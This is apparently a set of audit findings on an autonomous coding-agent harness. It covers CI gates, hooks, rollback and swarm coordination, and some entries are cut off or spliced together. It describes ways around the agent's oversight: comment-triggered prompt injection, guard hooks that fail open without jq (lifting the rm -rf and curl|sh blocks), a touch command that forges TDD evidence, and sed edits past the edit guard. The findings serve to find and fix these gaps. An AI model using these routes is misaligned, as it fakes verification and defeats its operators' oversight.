findings.title: evidence-gate's re-execution step assumes a dependency-free, service-free app — it cannot actually run a real target project
findings.what_it_is: The G49 re-execution step runs `bash .claude/scripts/verify.sh` (and `npx playwright test e2e/$spec`) immediately after `actions/checkout` with no stack setup whatsoever: no setup-node/setup-python, no `npm ci`/`uv sync`, no service containers, no env/secret injection (workflow env carries only GH_TOKEN and PR_NUMBER). Contrast ci.yml, which needed a detect job plus six setup steps to run the same project's tests. On any real app (a Node project without node_modules, a Python app without its venv, anything needing a database) verify.sh's coverage/test gates fail or the playwright webServer never boots — so the one truly required proof gate goes permanently red on every PR of a real target repo, wedging auto-mode delivery; on a stack it can't detect it instead degrades to whatever verify.sh skips silently.
findings.why_needed: evidence-gate is the harness's required 'operator trust guarantee' and the ONLY required check that proves the app works. If it cannot execute the app in the repo class the harness exists to ship (greenfield/brownfield apps with dependencies and services), e2e auto-mode delivery dead-ends at the first real PR.
findings.what_fix_will_do: Port ci.yml's detect+install pattern (or factor it into a composite action/reusable workflow shared by ci.yml and evidence-gate.yml) before the re-execution step; add a documented BYO services hook (e.g. run `docker compose -f compose.ci.yml up -d` when present, mirroring the BYO-deploy convention) and a `verify-ci.env` allowlisted env file; keep fail-closed semantics with an explicit ::error pointing at the missing setup rather than a raw npm/pytest stack trace.

findings.title: claude.yml grants contents:write + id-token:write to anyone who can type @claude — no author-association guard
findings.what_it_is: claude.yml triggers on issue_comment/review/issues and gates ONLY on the string '@claude' appearing in the body (jobs.claude.if, lines 26-30). Permissions are `contents: write, pull-requests: write, issues: write, id-token: write` (lines 18-22), and the step runs Opus via claude-code-action. There is no `github.event.comment.author_association` restriction (OWNER/MEMBER/COLLABORATOR), so on any public target repo a drive-by account can invoke a write-capable agent and feed it arbitrary instructions (issue bodies are exactly the 'external content as untrusted' class the constitution §II warns about). It cannot push protected main directly (if ci-gates-2 is fixed), but it can push to PR branches, open PRs, and manipulate issues — a route around the review gates that starts from a comment.
findings.why_needed: Auto-mode delivery assumes the only actor driving writes is the harness itself under its hook/gate stack. A comment-triggered write-capable workflow with no actor allowlist is an unauthenticated side door into the same repo the gates protect, and prompt-injection through it is exactly the attack the harness's own prompt-defense baseline names.
findings.what_fix_will_do: Add an author_association allowlist to the job `if:` (e.g. `contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.comment.author_association)`) for every trigger arm, and consider dropping `id-token: write` unless OIDC is actually used. Behavior for maintainers is unchanged.
findings.impact_on_other_features: claude.yml only at the file level; aligns with .claude/CLAUDE.md §II prompt-defense and the security agent's checklist; no effect on claude-review/claude-security (separate workflows). Should also be added to validate.sh or harness-doctor as a 'comment-triggered write workflow has actor guard' security-invariant check so target repos can't regress it.

findings.title: Three LLM workflows run on every push with no concurrency cancellation — per-PR gate cost compounds in auto mode
findings.what_it_is: Every `synchronize` event launches three Anthropic-billed runs: claude-review (Sonnet, 20-min timeout), claude-security (Opus multi-agent, 25-min timeout), and pr-review anti-slop (Sonnet, max_turns 20). None of the three has a `concurrency:` group — only ci.yml does (`group: ci-${{ github.ref }}, cancel-in-progress: true`, lines 15-17) — so an autopilot/swarm branch that pushes every few minutes (wip-checkpoint discipline) stacks superseded LLM runs instead of cancelling them. claude-security additionally has no `branches: [main]` filter, so it also fires on PRs targeting non-main branches (swarm integration branches), and pr-review duplicates a Sonnet pass that is `continue-on-error: true` (advisory) yet still costs a full run per push. docs/CI-COST.md exists but the gating set itself doesn't implement its own discipline.
findings.why_needed: Auto mode multiplies pushes (WIP checkpoints, self-heal loops up to 3 attempts, up to 10 swarm streams). Without cancellation the gate set's API+runner cost scales with push count, eats the Anthropic spend cap that cost-report.sh/budget enforcement watches, and queues stale reviews that post outdated findings onto moved PRs.
findings.what_fix_will_do: Add `concurrency: { group: <wf>-${{ github.event.pull_request.number }}, cancel-in-progress: true }` to claude-review.yml, claude-security.yml and pr-review.yml; add `branches: [main]` to claude-security's pull_request trigger (mirrors claude-review); optionally defer the Opus security run to ready_for_review + label for draft-heavy flows. Net effect: at most one in-flight LLM run per gate per PR.
findings.impact_on_other_features: docs/CI-COST.md (becomes true in the gating set); cost-report.sh / Anthropic spend cap headroom; required checks `review`/`security-review` semantics unchanged (cancelled runs are superseded by the new head's run, and strict_required_status_checks already demands up-to-date results); swarm (.swarms/) integration-branch PRs stop triggering Opus security runs; pr-review's 30-day advisory ramp (harness-doctor.sh:223) unaffected.

The genuinely unguarded surfaces without the ruleset are auto-merge-dependabot's `gh pr merge --auto --squash` (auto-merge-dependabot.yml:32), direct pushes/merges, and the approval/signature/linear-history rules. Also, application is an explicit documented prerequisite (docs/AUTOPILOT.md prerequisites table, docs/ONBOARDING.md Step 5) — the real gap is unverified-application + silent drift, which is high, not critical.

Verified end-to-end: evidence-gate.yml:22-25 has only actions/checkout, and the G49 step (lines 110-126) runs `bash .claude/scripts/verify.sh` and `npx playwright test e2e/$spec` with no setup-node/setup-python, no dependency install, no services, no env beyond GH_TOKEN/PR_NUMBER. verify.sh:78-95 invokes `npm test`/lint/typecheck directly off package.json sentinels with no install step, so on any real target repo the fresh CI checkout has no node_modules/venv and the required evidence-gate goes red on every PR (or silently degrades on undetected stacks). ci.yml's contrasting detect+install pipeline confirms the asymmetry. Not covered by LEDGER beyond G49/G52 creating the step itself. High stands.

Facts confirmed: claude-review.yml and claude-security.yml (required contexts review/security-review) consume secrets.ANTHROPIC_API_KEY with no preflight; grep of setup.sh for ANTHROPIC/secret returns nothing; no script runs `gh secret list`; harness-doctor has no CI-secrets check. However severity is overstated: the failure is fail-closed and loud (two red required checks on the very first PR), the secret is a documented mandatory setup step in TWO places the operator must follow before autopilot exists at all (docs/ONBOARDING.md Step 5 item 1 'required for the Claude Code Action workflows'; docs/AUTOPILOT.md prerequisites table with the exact `gh secret set` command), and the wedge is a one-time provisioning miss, not a silent enforcement hole. The quoted facts are accurate (claude.yml:18-22 permissions, :26-30 string-only @claude gate, no author_association in the if:), but the central exploit claim — 'a drive-by account can invoke a write-capable agent' — is wrong: anthropics/claude-code-action@v1 validates the triggering actor's repository permissions by default ('The action can only be triggered by users with write access to the repository', claude-code-action docs/security.md); claude.yml sets neither allowed_bots nor allowed_non_write_users, so non-collaborator comments cause the action's prepare step to refuse before any agent runs. findings.title: evidence-gate's G49 re-execution cannot succeed on a real project: its SKIP_* env vars are ignored by the Spec-003 skip-guard and it never installs the project toolchain
findings.what_it_is: Two interacting defects in the live re-execution step. (a) evidence-gate.yml:117 runs `SKIP_TDD_LEDGER=1 SKIP_STORY_MAP=1 SKIP_INTEG_COV=1 bash .claude/scripts/verify.sh`, but verify.sh:37-41 (`skip_honored`) only honors SKIP_* when the gitignored, human-only marker `.claude/state/allow-skip-gates` exists (verify.sh:28) — which can never exist on a fresh CI runner, and no workflow creates it (grep over .github/workflows finds zero references). So the FULL gate set runs in CI: story-map, integration coverage, TDD ledger, coverage, and the E2E journey gate. (b) The job has no actions/setup-node and no npm ci/pnpm install (the only installs are checkout at line 23 and `npx playwright install --with-deps chromium >/dev/null 2>&1 || true` at line 124), so verify.sh's Node branch (verify.sh:78 `if [ -f package.json ]`) runs tests/coverage with no node_modules. Either defect alone fails every real-app PR with the misleading message 'evidence diverges from reality (G49)' (line 118). findings.why_needed: evidence-gate is a required merge check (main-protection.json:35). In auto mode the agent cannot satisfy it: SKIPs it sets are ignored by design (Spec-003 anti-bypass), and it cannot provision the runner. findings.title: AC-id matching is format-fragile: spec template emits AC-1 while the rig docs teach @AC-01, and collect-evidence's grep prefix-collides AC-1 with AC-10
findings.what_it_is: The canonical spec template numbers criteria unpadded — specs/templates/spec.md:48 `1. **AC-1**:` — but every authoring instruction for the tests teaches zero-padded tags: verifier.md:48 'tagged `{ tag: ['@AC-0N'] }`', _evidence.ts:63 example `tag: ["@AC-01", "@spec-042"]`, tdd-loop SKILL.md:19 '`@AC-01`'. spec-match.sh compares with exact-line match (spec-match.sh:67 `grep -qx "$ac"`), so a passing test tagged @AC-01 never proves spec id AC-1 → permanent UNPROVEN. Separately, collect-evidence.sh:86 checks `grep -qE "✓ $ac"` with no word boundary, so spec-match's line '✓ AC-10 — proven' satisfies the check for AC-1 — an unproven AC-1 can be stamped proven in evidence.json on any spec with ≥10 criteria.
findings.why_needed: In auto mode the spec is generated from the template (AC-1) and the journey tests are generated from the rig docs (@AC-01) by different agents in different sessions; nothing reconciles the two formats. findings.title: Coverage gate fails OPEN on every path the agent controls: no coverage script = skip, failing coverage run = skip, missing summary = note; Rust has no coverage gate at all
findings.what_it_is: Constitution §VII.6 claims 'Coverage gate: ≥ 90% line, ≥ 85% branch ... verify.sh enforces.' In reality the Node gate is condition-gated on the project opting in: `grep -q '"coverage"\|"test:coverage"' package.json` (verify.sh:104) — a greenfield app whose agent simply never adds a coverage script is never gated, with no warning and no fail. If the coverage script itself exits non-zero, `if $PM run "$cov_script" ...; then` (line 108) has no else branch — silent skip. If coverage-summary.json isn't produced, the only output is an echo hint (line 128), not a failure. Python's gate is similarly inside `if uv run coverage run ... && uv run coverage report ...; then` (line 147) with no else. The Rust block (lines 161-166) has check/clippy/test but zero coverage measurement. Go's 'coverage' is an unweighted mean of per-package percentages that excludes test-less packages from the denominator (line 177 awk averages only lines containing 'coverage:'), inflating the number.
findings.why_needed: In auto mode the implementer is the same actor who decides whether a coverage script exists. A gate that only fires when the gated party opts in is not a gate — the §VII.6 verification contract and the codecov.yml 95%-critical-path story are vacuous for any project the harness itself scaffolds, and the SKIP_* operator-marker hardening (Spec 003) is bypassed trivially by just not configuring coverage.
findings.what_fix_will_do: Invert polarity: when a stack block runs tests, absence of coverage tooling/script/report becomes a FAIL (with the existing allow-skip-gates marker as the operator waiver); add an else branch on the coverage-run `if`s; add cargo llvm-cov (or tarpaulin) to the Rust block; switch Go to `go test -coverprofile` + `go tool cover -func` total instead of the per-package mean.
findings.impact_on_other_features: Constitution §VII.6 (becomes true instead of aspirational), evidence-gate.yml re-run (stricter), self-heal loop (new failure class to heal: 'add coverage tooling'), setup.sh/greenfield scaffolding (should seed a coverage script so fresh projects don't start red), codecov.yml component thresholds, SKIP_COVERAGE semantics in CLAUDE.md dev commands.

findings.title: Python toolchain is hardcoded to uv across verify.sh / test-unit.sh / run.sh — poetry/pipenv/pip projects either churn the self-heal loop forever or skip verification entirely
findings.what_it_is: Unlike the Node block's four-way lockfile ladder, every Python invocation hardcodes uv: verify.sh:141 `uv run pytest -q`, verify.sh:147 `uv run coverage run -m pytest`, test-unit.sh:16 `exec uv run pytest tests/ -q`, run.sh:25-30 `exec uv run uvicorn/flask/manage.py`. There is no poetry.lock/Pipfile/requirements.txt package-manager detection anywhere. A poetry-managed brownfield repo ([tool.poetry] deps that uv cannot resolve, dev-deps holding pytest) fails `uv run pytest` on every single loop iteration — fail-closed but unfixable without converting the project's packaging (a broad, unrequested change Karpathy §I.3 forbids). Conversely a requirements.txt-only project has no pyproject.toml, so verify.sh's whole Python block (line 135) never fires — silent green. Inside the block, lint polarity is also inverted vs lint.sh: ruff/mypy are run only `command -v ruff >/dev/null && {...}` (verify.sh:137-139) — absent tools are silently skipped here while lint.sh:52-54 counts ruff-absence as a failure.
findings.why_needed: Python is arguably the #1 brownfield-adoption stack and poetry still dominates existing repos. Auto mode on a poetry repo either burns the overnight budget in verify-fail/self-heal/pivot cycles (loop-iteration.sh marks PIVOT after 2 aborts) or, on requirements.txt repos, ships with zero pytest runs. Both outcomes break the 'as solid as Claude Code itself' bar.
findings.what_fix_will_do: Add a PM ladder mirroring the Node one: uv.lock→`uv run`, poetry.lock→`poetry run`, Pipfile.lock→`pipenv run`, else `python -m pytest` in the ambient env; key the Python block on detect-stacks.sh's broader sentinel set (pyproject OR requirements.txt OR setup.py); align tool-absence polarity with lint.sh (missing pytest/ruff in a detected Python stack = fail, not skip).
findings.impact_on_other_features: run.sh (verifier agent + browser-e2e rig boot the app through it — uvicorn/flask/django lines must use the same PM ladder), fastapi/flask-realtime skills (assume the harness can run the app), test-unit.sh/ci.yml, self-heal + pivot machinery (stops mis-firing on toolchain mismatch), adopt/brownfield flow in docs/ADOPTION.md.

findings.title: Runner-flag and tool-absence asymmetries: vitest-only `--run` hardcoded into every Node test invocation; lint.sh java/infra arms silently pass when the linter binary is missing
findings.what_it_is: Two consistency bugs in the per-stack arms. (a) verify.sh:94-99 and test-unit.sh:9-12 append the vitest-specific `--run` flag unconditionally (`npm test -- --run`, `pnpm test --run`, `yarn test --run`): a jest or node:test greenfield rejects the unrecognized flag, so unit tests fail on every iteration for non-vitest runners (fail-closed churn that self-heal will 'fix' by mangling the test script); bun is special-cased but verify.sh checks `bun.lock || bun.lockb` (line 83) while lint.sh:38 checks only `bun.lock` — a bun.lockb-era repo falls to npm in lint. (b) lint.sh's java arm (lines 69-74) is an if/elif with NO else: when neither gradle nor mvn binaries are on PATH the arm does nothing and `failures` stays 0 — silent pass; same silent-skip shape for terraform (tflint), docker (hadolint), shell (shellcheck), sql (sqlfluff) when tools are absent, while the python arm fails on missing ruff. Polarity is per-arm arbitrary, so 'refusing silent pass' (the Round-8-E promise) only holds for the zero-stacks case.
findings.why_needed: Auto mode needs deterministic, stack-agnostic gates: a runner flag that breaks jest forces the agent into destructive workarounds, and tool-absence silent passes mean a detected java stack with no JDK toolchain in the overnight sandbox lints green. Both produce wrong signals exactly when nobody is watching.
findings.what_fix_will_do: Detect the runner before adding flags (grep package.json devDeps for vitest vs jest; pass `--run` only for vitest, `--ci` for jest, nothing otherwise); unify bun lockfile checks; give every lint.sh/typecheck.sh arm an explicit else that either fails or prints a counted `⚠ tool missing` failure consistent with the python arm (with a documented LINT_TOOL_MISSING_OK operator escape for genuinely optional infra linters).
findings.impact_on_other_features: verify.sh + test-unit.sh + lint.sh + typecheck.sh change together (keep arms in lockstep); ci.yml and local-pr-check.sh inherit the stricter behavior; overnight-build sandbox provisioning docs (docs/AUTOPILOT.md) must list required toolchains since missing linters now fail instead of skip; self-heal gets cleaner failure messages to act on.

findings.title: Rollback is prose, not executable: the flag-flip step is a comment, the canary breach path only fails the job, and the prod-alert pipeline never attempts a rollback
findings.what_it_is: Four broken links in the rollback chain. (1) /rollback-flag's core action is literally a comment: rollback-flag.md '# 2. Flip to 0% (kill) / # Provider-specific call via MCP' — steps 1 and 3 shell out to `claude -p ... --bare` prompts, no script exists (.claude/scripts has no flag/rollback script; only scan-stale-flags.sh). (2) The canary 'auto-rollback' is a failed job: canary-deploy.yml:71-72 prints '::error::SLO burn breach during canary ... — auto-rollback' then `exit 1`, leaving the canary serving traffic; DEPLOY-INTEGRATION.md checklist item 4 admits it ('Wire it to the ::error:: ... exit path so a burn breach auto-rolls-back instead of just failing the job'). (3) flag-rollout's auto-rollback discipline assigns monitoring to a watcher that does not exist: 'The release agent's post-deploy watch monitors these' — release.md has maxTurns: 30 and its workflow ends at CHANGELOG/feedback closure, no watch loop. (4) hotfix-ingest.yml (the prod-alert consumer) goes straight to fix-forward (hotfix-to-task.sh → autonomous fix → PR) and never tries the flag flip, contradicting playbooks/rollback.md Step 0 'the flip is your first move'. Bonus rot: rollback.md Step 1 says 'gh workflow disable deploy.yml' — no deploy.yml exists in .github/workflows.
findings.why_needed: Auto mode deploys with nobody watching; the entire safety case for autonomous prod delivery rests on rollback being mechanical and faster than the blast radius grows. Today a metric breach produces a red workflow and a Slack-prompt suggestion, while the bad code keeps serving. 'Auto-rollback on metric breach' is advertised in three places and implemented in zero.
findings.what_fix_will_do: Ship an executable `.claude/scripts/rollback-flag.sh` with provider adapters (OpenFeature/PostHog HTTP call using the already-catalogued MCP env keys; loud non-zero failure when no provider is configured) plus a local REGISTRY.md state update. Call it from: the canary-deploy breach path (before exit 1), hotfix-ingest.yml as a first-responder step when the alert fingerprint maps to a flag-gated spec, and /rollback-flag (replacing the comment). Fix the dead deploy.yml reference in the playbook.
findings.impact_on_other_features: commands/rollback-flag.md, .github/workflows/canary-deploy.yml + hotfix-ingest.yml, flag-rollout/flag-cleanup skills, playbooks/rollback.md + flag-kill.md, /incident-start flow (script should open the incident file), pre-bash-guard.sh (the script's curl calls must not trip the curl|sh pattern — verify), validate.sh executable-bit + hook checks for the new script.

findings.title: Two uncoordinated tagging authorities, and release-please is misconfigured out of the box (no manifest, hardcoded node release-type, placeholder package name)
findings.what_it_is: release-please.yml runs `googleapis/release-please-action@v4` on every push to main, but the repo ships release-please-config.json with `"release-type": "node"` and `"package-name": "@your-org/your-repo"` and NO `.release-please-manifest.json` (ls: 'No such file or directory') — v4's manifest mode errors without it, and the node release-type is wrong for any non-node target project (and for this harness itself, which root CLAUDE.md says has no package.json). Neither setup.sh nor harness-doctor.sh references release-please (grep empty), so adoption never patches it. Simultaneously, /ship step 10 has the agent tag manually ('Tag the release if semver bump (gh release create)', ship SKILL.md:28) and release.md:72-75 hand-bumps the version, tags, runs `gh release create v<version> --notes-from-tag`, then step 10 hand-appends CHANGELOG.md — duplicating exactly what release-please owns. Result in auto mode: either a red workflow on every main push (loud but permanently broken) or, once someone 'fixes' the manifest, divergent tags/changelogs from two writers.
findings.why_needed: Autonomous delivery needs exactly one deterministic version/tag/changelog authority — tags feed `gh release create`, deploy SHA selection (canary-deploy input `sha`), and rollback target identification ('re-deploy previous binary' needs an unambiguous previous version). A broken-by-default release workflow also trains operators to ignore red CI, eroding the gate culture the rest of the harness depends on.
findings.what_fix_will_do: Declare release-please the single tagging/changelog authority: seed `.release-please-manifest.json`, have setup.sh detect the stack and set release-type (or gate the workflow with a loud skip-with-warning when config is still placeholder), and rewrite ship step 10 + release.md steps 7/10 to 'merge the release-please PR' instead of manual bump/tag/CHANGELOG-append. Add a doctor check for placeholder package-name.
findings.impact_on_other_features: release-please.yml, release-please-config.json, .claude/scripts/setup.sh, ship skill step 10, release agent steps 7 and 10 (drops its CHANGELOG.md append), commitlint.yml/commit trailers (Conventional Commits become the changelog source of record), harness-validate.yml (new seeded file), /changelog command.

findings.title: Constitution guard denies all Write/Edit to tasks/TASKS.md and specs/active/* — the exact files every inner-loop agent is instructed to mutate; status flips have no lock-safe path at all
findings.what_it_is: pre-edit-constitution-guard.sh's deny-list includes `tasks/TASKS.md` and `specs/active/*` (exit 2 hard deny on Write/Edit/NotebookEdit). But implementer.md:32 says 'Mark the task complete in tasks/TASKS.md', autopilot SKILL.md:90 'Mark task [x] in tasks/TASKS.md', self-heal SKILL.md:51 'Mark the task [!] in tasks/TASKS.md', feature-stream.md:49 'Mark task [x] in tasks/TASKS.md'. There is NO helper script for status flips (grep for task-status/tasks_set_status/mark-task across .claude+docs returns nothing; tasks-lib.sh exposes only tasks_insert_top/tasks_append_active). The guard's own test never covers TASKS.md (test/pre-edit-constitution-guard.sh has no TASKS/specs assertions). So the only live path is improvised `sed -i` via Bash — which bypasses with_tasks_lock entirely AND bypasses the PostToolUse Write hooks (post-write-roadmap.sh:17 only advances spec status on a *Write* of tasks/TASKS.md). Additionally feature-stream.md:49,67 directly contradicts parallel-swarm SKILL.md:94 ('tasks/TASKS.md is coordinator-owned... only the coordinator marks [x]/[!]/[s]').
findings.why_needed: TASKS.md is the constitutionally-declared SOLE source of truth for task state (§XVI). In auto mode the loop cannot ask a human how to flip a checkbox. Crash-injection outcome today: agent finishes a task, Edit is denied → it either treats the deny as a hard stop (loop stalls), or sed-flips unlocked while the 10-min Sentry hotfix poll (hotfix-to-task.sh) does its awk+mv — a classic lost update that silently drops a hotfix task or reverts a status flip in the single source of truth. Add deny-list coverage for TASKS.md/specs to the guard test. Same for spec authoring: either carve specs/active/* out of the deny-list or give /specify a sanctioned write path.

findings.title: verified-merge.sh's AI-mediation and post-merge-autofix recovery rungs are dead code — a JUSTIFIED comment inside a line-continuation strips the prompt and the log redirect from both `claude -p` invocations
findings.what_it_is: At verified-merge.sh:139-145 and 193-198, a `# JUSTIFIED:` comment line sits between a trailing `\` continuation and the positional prompt. Shell semantics: the comment terminates the claude command after --append-system-prompt, so `claude -p` runs with NO user prompt and its output unredirected; the next line ('Fix the integration failure for stream ...' / 'Investigate the post-merge failure' >> $LOG) executes as a separate command-not-found whose 127 is swallowed by `|| true`. I confirmed by simulation with a stub: claude received only 9 args ('-p --max-turns 30 --max-budget-usd 2 --permission-mode auto --append-system-prompt test prompt'), no prompt, output to stdout, subshell exit 0. bash -n passes — nothing catches it.
findings.why_needed: This is the swarm's self-heal ladder for integration failures: step 3 mediation is the only thing standing between 'rebase/verify failed' and a human-required escalation, and the post-merge autofix is the only thing that re-opens a fix PR after main is auto-reverted. With both rungs dead, every semantic conflict in a 10-stream auto-mode swarm escalates (exit 30) instead of self-healing, and every post-merge revert leaves main reverted with no fix PR in flight — the overnight fleet's recovery story silently degrades to 'wait for a human'.
findings.what_fix_will_do: Move the JUSTIFIED comments above the command (or onto the `|| true` line without breaking continuation), keep the positional prompt and `>> $LOG 2>&1` attached, and add a smoke test (stub `claude`, assert argv contains the prompt and that stdout lands in the log). Mediation will then actually run before escalate(30), and the autofix PR will actually open after an auto-revert.
findings.impact_on_other_features: Isolated to .claude/scripts/verified-merge.sh, but the fix pattern matters for lint-silent-failures.sh conventions (its required JUSTIFIED comments caused the breakage — the linter should flag comments that terminate a continuation). Downstream consumers unchanged: fleet.json statuses, decisions.log, findings-to-tasks triage tasks.

findings.title: A session killed mid-task orphans the [~] marker forever — no automation detects, resets, or surfaces stale in-progress (or [b] blocked) tasks
findings.what_it_is: loop-iteration.sh:52 picks only `^- \[ \]`; requeue-failed.sh:33-39 surfaces only `^- \[!\]`; gc-tasks.sh:6 keeps [~]/[b] alive but untouched; session-end.sh:103-108 reports [~]/[b] only on GRACEFUL exit, which by the heartbeat design never runs on a kill (session-heartbeat.sh:4-9). session-start-context.sh:32-38 injects a killed-session banner but reconciles nothing. Nothing ever flips [b]→[ ] when deps complete either. So: crash injection mid-implement leaves the task [~]; the next loop iteration skips it (not [ ]), requeue-failed can't see it (not [!]), and if it was the last pending task loop-iteration declares the backlog empty and branches to IDEATE (lines 53-62) while a half-done feature rots in the sole source of truth.
findings.why_needed: Auto-mode overnight runs are exactly where sessions die (OOM, runner timeout, budget kill). Today's self-heal/pivot machinery only engages on tasks that REPORT abort ('loop-iteration.sh record T-<id> abort', autopilot SKILL.md:59) — a kill never reports. surviving.title: setup.sh gitignores the entire verify/ directory, making evidence-gate's 'evidence.json must be in the PR diff' requirement unsatisfiable in every project that ran setup
surviving.what_it_is: setup.sh appends a bare 'verify/' to .gitignore (setup.sh:151, ensure_ignore "verify/"). Internally inconsistent: the producer (setup.sh) and the consumer (evidence-gate G53) directly contradict each other, and the README quickstart cp list does not even copy .gitignore, so setup's broken entry is the ONLY verify/ rule the new project has.

surviving.title: jq is load-bearing for the deterministic guardrail layer, but a missing jq is only a setup warning and makes security hooks fail OPEN
surviving.what_it_is: setup.sh treats a missing jq as a warn-and-continue ('jq not installed — REQUIRED for hooks', setup.sh:20 — note it says REQUIRED but uses warn, while missing git uses fail). pre-bash-guard.sh runs 'set -euo pipefail' (line 6) and parses stdin with jq at line 12; with jq absent the script dies with exit 127 — and per the hook contract only 'exit 2 = block' (pre-bash-guard.sh:4, root CLAUDE.md hook mechanics), so a non-2 failure is a non-blocking error and every Bash command sails through unguarded. The same jq-or-die pattern is in stop-verify.sh (:17) and the other JSON-parsing hooks. validate.sh likewise degrades to a warning ('jq not installed — JSON files not validated', validate.sh:100) and silently skips its jq-guarded hook-coverage and security-invariant checks (:339, :516), so the one tool that should catch the degraded state passes instead.
surviving.why_needed: Auto Mode's whole safety story is 'hooks fire FIRST — hard-block destructive ops before the classifier' (constitution §X). On a host without jq (minimal containers, fresh Linux boxes, the overnight sandbox image) the entire deterministic deny layer — rm -rf, force-push, curl|sh blocks — is silently absent while the harness reports itself healthy. Fail-open security on the unattended path is exactly what this harness promises not to be.
surviving.what_fix_will_do: Promote jq to a hard requirement in setup.sh (fail, matching the git check — jq is a one-line install everywhere), and add a fail-closed preamble to the security-critical hooks (pre-bash-guard, pre-edit-constitution-guard, pre-write-secret-scan, stop-verify): 'command -v jq >/dev/null || { echo "jq missing — blocking by default" >&2; exit 2; }'. Add a validate.sh hard-fail (not warn) when jq is absent so harness-doctor surfaces it.
surviving.impact_on_other_features: setup.sh; every hook in .claude/hooks/ (preamble must not add measurable latency — it's one command -v); validate.sh [json]/[security] categories; docs (README prerequisites). Fail-closed jq check will also block ALL tool use on a jq-less host until installed — intended, but must be documented in setup output so the operator isn't mystified.

surviving.title: Legacy-safety manifest fails OPEN on non-conventional layouts (monorepos get zero protection, silently)

surviving.title: import-issues-once treats gh failure as 'no issues' and still writes the permanent sentinel — silent total backlog loss under /adopt auto

surviving.title: Red/green ledger gates verify file EXISTENCE only — touch red.log defeats them, and the ledgered command is never bound to the task's accept: command
surviving.what_it_is: Both consumers of the TDD ledger check only that files exist. verify.sh's inline gate does `find verify -path "*/${task_id}/red.log" | grep -q .` (verify.sh:208) and the same for green.log (:213); check-tdd-ledger.sh likewise tests presence ('if [ -n "$red" ] && [ -n "$green" ]', check-tdd-ledger.sh:44). Neither parses the `exit_code:` line that tdd-ledger.sh writes (tdd-ledger.sh:44), neither compares the ledgered `command:` against the task's `accept:` field in tasks/TASKS.md, and neither checks that red.log's timestamp precedes green.log's. So `mkdir -p verify/$(date +%F)/T-123 && touch verify/$(date +%F)/T-123/{red,green}.log` fully satisfies the gate; so does ledgering red with `"false"` and green with `"true"`, or ledgering a different (trivial) test than the accept command, or running red AFTER the implementation exists with a deliberately broken command. The honest path exists only inside tdd-ledger.sh, which the agent invokes voluntarily.
surviving.why_needed: In auto mode the implementer (an Opus agent under self-heal/loop pressure, with no human watching) is exactly the actor known to reward-hack verification artifacts. The constitution sells the ledger as proof ('verify.sh blocks [x] tasks without both', .claude/CLAUDE.md §VII.1) — if the proof is forgeable by touch, the entire red-before-green guarantee for unattended greenfield/brownfield delivery is honor-system, and every downstream consumer (evidence bundle, PR gate) inherits a fake attestation.
surviving.what_fix_will_do: Make the two gate consumers parse log content instead of presence: require the structured header tdd-ledger.sh already writes — `exit_code:` non-zero in red.log, 0 in green.log, identical (or accept:-matching) `command:` in both, and red `timestamp:` < green `timestamp:`. Cross-check `command:` against the task's `accept:` line in tasks/TASKS.md (normalized). A touched-empty or mismatched log then fails loudly with a specific reason, closing the touch/false-command/green-first holes without changing the implementer's workflow at all.
surviving.impact_on_other_features: verify.sh inline gate (lines 200-224), check-tdd-ledger.sh (and its consumer harness-validate.yml:92), tdd-ledger.sh (header format becomes a parsed contract — version it), evidence-gate.yml (re-executes verify.sh, finding tdd-loop-2), tdd-loop skill + implementer.md prose claiming the gate 'BLOCKS', and the 164-test gap-fix rig if it asserts current presence-only behavior.

'missing script: test', 'pytest: command not found', a syntax error in the test file, or a wrong path all exit non-zero and mint a valid red.log — red-for-the-WRONG-reason, which is precisely the greenfield-day-one failure mode (test runner not yet configured). The skill demands 'fails for the RIGHT reason' (tdd-loop/SKILL.md:22) but nothing checks it. Green is recorded on a single lucky pass with no flake detection, and the eval has no `timeout` wrapper (grep for timeout in tdd-ledger.sh/verify.sh: no hits) — a watch-mode runner (bare `vitest`/`jest --watch`) or a test waiting on a server hangs the unattended loop until the outer Bash-tool timeout kills it with no artifact. self-heal's tier-1 transient retry (self-heal/SKILL.md:26-28) is prose for a different phase, not a ledger policy.

surviving.title: The loop-control state machine has no deterministic driver: neither /loop nor /verify-loop ever invokes loop-iteration.sh, and abort/progress recording is LLM prose only

The only producer instruction is prose in autopilot/SKILL.md:57-60 ('After each task you MUST report the outcome'); grep shows loop_state_record's sole caller is loop-iteration.sh itself, and no hook records [!]/[x] transitions on TASKS.md writes. Pick next unblocked task...') and verify-loop/SKILL.md (lines 17-35) — contain zero references to loop-iteration.sh (verified by grep). surviving.title: Stop hooks exit 2 with no stop_hook_active re-entry guard — an unattended run that cannot pass verification is forbidden from ever stopping (budget-burning livelock)
surviving.what_it_is: stop-verify.sh's block() unconditionally exits 2 ('echo "$1 Run /verify before ending." >&2; exit 2', lines 69-73) whenever prod files changed without a fresh PASS report; subagent-stop.sh likewise hard-exits 2 at lines 78 and 132 for coordinator/feature-stream. Claude Code passes stop_hook_active:true in the Stop/SubagentStop hook input precisely so hooks can break this cycle — grep confirms the string appears nowhere in .claude/hooks/ or scripts. In an overnight Auto Mode run where verification structurally cannot pass (BYO-deploy stack missing, Playwright not installed, flaky suite), the agent finishes its work, tries to stop, is blocked, tries to /verify, fails, tries to stop, is blocked again — cycling until max_turns:600 / $30 budget exhausts, and OVERNIGHT_REPORT.md (end-of-run step) is never written, so the morning human sees nothing.
surviving.why_needed: An autonomous fleet must always have a safe terminal state. A stop gate that can never be satisfied converts a verification failure into 8 hours of paid thrash plus a missing report — strictly worse than stopping with an ESCALATION. The ledger's G48 hardened WHAT the gate checks; it did not bound HOW MANY times the gate may block.

surviving.title: Split-brain swarm state: every coordinator sensing channel (handoffs, state.json, lane events) is written inside the stream's worktree on gitignored paths and read from the root checkout
